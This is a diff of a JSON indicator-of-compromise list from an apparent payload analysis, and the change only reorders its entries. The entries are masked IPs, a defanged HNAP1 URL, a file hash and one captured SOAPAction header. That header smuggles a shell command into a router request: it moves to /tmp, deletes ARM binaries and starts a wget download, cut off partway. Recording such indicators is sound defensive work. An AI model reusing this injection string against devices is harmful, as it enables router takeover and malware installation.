@@ -1,9 +1,9 @@
 [
   {
-    "context": "Embedded IP in inbound payload",
-    "source": "static_analysis",
-    "type": "ip",
-    "value": "190.179.168.XXX"
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://purenetworks[.]com/HNAP1/GetDeviceSettings/"
   },
   {
     "context": "Embedded IP in inbound payload",
@@ -12,21 +12,21 @@
     "value": "201.51.13.XXX"
   },
   {
-    "context": "Embedded URL in inbound payload",
-    "source": "strings",
-    "type": "url",
-    "value": "hxxp://purenetworks[.]com/HNAP1/GetDeviceSettings/"
-  },
-  {
-    "context": "Inbound payload hash (unknown)",
+    "context": "Embedded IP in inbound payload",
     "source": "static_analysis",
-    "type": "hash",
-    "value": "39e2199e534dd2e9676170228389a70e595b51f8a8ee791d186fed014dc372a9"
+    "type": "ip",
+    "value": "190.179.168.XXX"
   },
   {
     "context": "Suspicious command in inbound payload",
     "source": "strings",
     "type": "command",
     "value": "SOAPAction: \"hxxp://purenetworks[.]com/HNAP1/GetDeviceSettings/`cd%2B/tmp;rm%2Bmain_arm%2Bmain_arm7%2Barm7%2Barm;wget%2Bht"
+  },
+  {
+    "context": "Inbound payload hash (unknown)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "39e2199e534dd2e9676170228389a70e595b51f8a8ee791d186fed014dc372a9"
   }
 ]
